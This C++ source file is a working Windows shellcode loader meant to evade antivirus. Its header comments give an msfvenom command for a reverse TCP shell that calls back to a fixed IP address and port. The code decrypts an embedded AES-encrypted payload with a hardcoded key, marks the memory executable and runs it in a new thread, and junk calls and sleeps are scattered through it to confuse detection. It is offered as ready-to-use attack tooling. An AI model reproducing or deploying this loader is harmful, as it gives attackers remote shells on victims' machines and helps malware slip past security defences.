//to compile:- x86_64-w64-mingw32-g++ --static -o pay.exe simple.cpp -fpermissive -lws2_32
//payload:- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.175 LPORT=8000 -f raw >beacon.bin
//python3 aes.py beacon.bin:copy the output and paste it in this script
#include <math.h>
#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <ctime>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

#pragma comment(lib, "ntdll")

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096
//random function not important
void random_function() {
    // Arbitrary functionality to add noise
    printf("Random function executing...\n");
    int dummy = rand() * time(NULL);
    printf("Dummy value: %d\n", dummy);
    
}

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

//Getting the payload from remote server function

int main(){

        Sleep(2000);
        DWORD nndPreferred = 0xFFFFFFFF;
        Sleep(2000);
        
        unsigned char AESkey[] = { 0x15, 0x0, 0xea, 0xc6, 0xb2, 0x7e, 0x76, 0x26, 0x3d, 0xac, 0x16, 0x65, 0x5f, 0x58, 0x5f, 0xe3 };
        unsigned char AESCode[] = { 0x51, 0x38, 0x85, 0x57, 0x76, 0x54, 0xf3, 0x9e, 0x1c, 0x44, 0xcd, 0x94, 0x8b, 0x91, 0x36, 0x78, 0x1d, 0x56, 0xd, 0xd4, 0xe7, 0x1f, 0xd1, 0x97, 0x4, 0xb2, 0xe5, 0x34, 0x9c, 0x7c, 0x75, 0x57, 0x29, 0x4e, 0x10, 0xad, 0xb1, 0x7, 0x3c, 0xe4, 0xbd, 0xa9, 0x55, 0x4, 0xe6, 0xec, 0xea, 0x79, 0xae, 0x6e, 0x38, 0x6b, 0xe3, 0x62, 0x5d, 0xb9, 0x7a, 0xf1, 0x38, 0xc3, 0x1b, 0x28, 0xc7, 0xc2, 0x2a, 0x1c, 0x19, 0x80, 0xb1, 0x2e, 0x8e, 0x1e, 0x7c, 0x1b, 0x39, 0x2, 0x4a, 0xb5, 0x15, 0xf1, 0x19, 0x5f, 0xb4, 0xf, 0xca, 0xfc, 0x44, 0x3d, 0x71, 0x53, 0x7f, 0x48, 0x45, 0xe1, 0x92, 0xfd, 0xb, 0x14, 0xb0, 0x2f, 0x53, 0x46, 0x5b, 0xc9, 0xbd, 0x6, 0x48, 0x94, 0xdd, 0x67, 0xb3, 0x38, 0xa9, 0xa0, 0xa2, 0xc4, 0x27, 0x62, 0xfd, 0x5b, 0x82, 0x9f, 0xe7, 0x78, 0x9a, 0x8c, 0xe0, 0x26, 0x2a, 0xf4, 0x64, 0xd0, 0x38, 0x77, 0x22, 0x67, 0x54, 0x8a, 0x0, 0xb8, 0xe7, 0x73, 0xad, 0x2d, 0xd5, 0x7, 0xfc, 0x94, 0x1b, 0x66, 0x75, 0x77, 0xa7, 0x6b, 0x24, 0x2e, 0xff, 0xff, 0x60, 0xe8, 0xd0, 0x4, 0x7, 0x82, 0x0, 0x14, 0xdd, 0xf9, 0x16, 0x68, 0xc7, 0xb5, 0x91, 0x79, 0xb8, 0x36, 0xcc, 0x8f, 0x29, 0x9a, 0x91, 0xb5, 0xf5, 0x3d, 0xbd, 0x2b, 0xad, 0xe2, 0x9f, 0x1, 0xbe, 0x49, 0x4b, 0x93, 0x8b, 0xbe, 0xb4, 0x64, 0xa9, 0x33, 0xb6, 0xf, 0x44, 0x70, 0xa1, 0xcb, 0x29, 0x42, 0x68, 0xd9, 0x14, 0xd2, 0xf7, 0xeb, 0xfe, 0xb6, 0x4c, 0x1b, 0x33, 0x51, 0xb6, 0x2a, 0x85, 0x3, 0xd2, 0x1b, 0x32, 0x6a, 0x39, 0x1d, 0x6e, 0x6d, 0x1e, 0x8c, 0xc, 0x71, 0xf5, 0xe8, 0xf1, 0xd2, 0x35, 0x68, 0x75, 0x87, 0xf3, 0x75, 0xba, 0x81, 0x10, 0x38, 0x8f, 0xcc, 0x24, 0x6c, 0xca, 0xd2, 0xc4, 0x3d, 0xa2, 0x6f, 0x8f, 0x86, 0x6c, 0x88, 0xa1, 0x47, 0x89, 0xed, 0x62, 0xc5, 0x44, 0x23, 0xc8, 0x35, 0x19, 0x25, 0x0, 0x98, 0x73, 0xbd, 0x8d, 0xf3, 0xbe, 0x95, 0xcd, 0xf0, 0x9e, 0xc, 0x80, 0xaa, 0xbe, 0xc6, 0x10, 0xfc, 0xb8, 0xa1, 0xcc, 0x6e, 0x63, 0x1d, 0x8, 0xb7, 0x83, 0x7b, 0x3, 0xe9, 0xbf, 0x1f, 0x6f, 0xfe, 0xec, 0xc8, 0xf0, 0x2, 0x76, 0xc5, 0xf3, 0x75, 0x8e, 0xb7, 0x0, 0x10, 0xd6, 0x6e, 0xaa, 0xd2, 0x93, 0xc4, 0xcd, 0x9e, 0x54, 0x3, 0x6f, 0x3e, 0x9, 0xd7, 0x34, 0x1, 0xfb, 0xe0, 0xb1, 0x3b, 0xa9, 0xf3, 0x10, 0x56, 0x99, 0xc7, 0x1a, 0xd1, 0xc0, 0x4, 0xe3, 0x90, 0xc1, 0x29, 0x57, 0xea, 0x48, 0x7e, 0x8b, 0xf3, 0x95, 0x21, 0x1, 0xbf, 0xb2, 0xec, 0x7f, 0x67, 0xd4, 0x50, 0x4, 0x86, 0xb2, 0xba, 0x96, 0x24, 0x22, 0x9f, 0xcf, 0x8a, 0xd4, 0x59, 0xcc, 0x95, 0x89, 0x30, 0x6c, 0xf, 0x6b, 0x13, 0x4f, 0x67, 0x8e, 0xe0, 0x9f, 0x6, 0xb6, 0x99, 0xba, 0x70, 0xf, 0xa4, 0x49, 0xc5, 0x3d, 0x27, 0xa3, 0xa5, 0x91, 0x75, 0xdb, 0xad, 0x58, 0xdc, 0xc4, 0xac, 0xaf, 0x37, 0xdc, 0x31, 0x16, 0x5d, 0x8e, 0x5f, 0x6c, 0x5e, 0xf6, 0x39, 0x72, 0x3b, 0xea, 0xb9, 0x84, 0x2e, 0x2, 0xd6, 0x53, 0x3, 0x66, 0x75, 0x9c, 0xde, 0x81, 0x7a, 0x85, 0x24, 0x75, 0x2, 0xe1, 0xa4, 0xdb, 0xbd, 0x28, 0xaf, 0x3d, 0x95, 0x50, 0xeb, 0xb3, 0x17, 0xee, 0x9a };
        
        
	LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(AESCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, nndPreferred);
	printf("this is very cool");
	int *array = (int *)calloc(5, sizeof(int));
        if (array) {
           array[0] = 1;
           free(array);
        } 
        
        DecryptAES((char*) AESCode, sizeof(AESCode), AESkey , sizeof(AESkey));
	
	memcpy(memalo, AESCode, sizeof(AESCode));


	DWORD oldProtect;
	char str1[20] = "Hello, ";
        char str2[] = "World!";

	VirtualProtect(memalo, sizeof(AESCode), PAGE_EXECUTE_READ, &oldProtect); 
	int random = rand();


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
	int random2 = rand();
	
	WaitForSingleObject(tHandle, -1);
	getchar();
	

	return 0;

}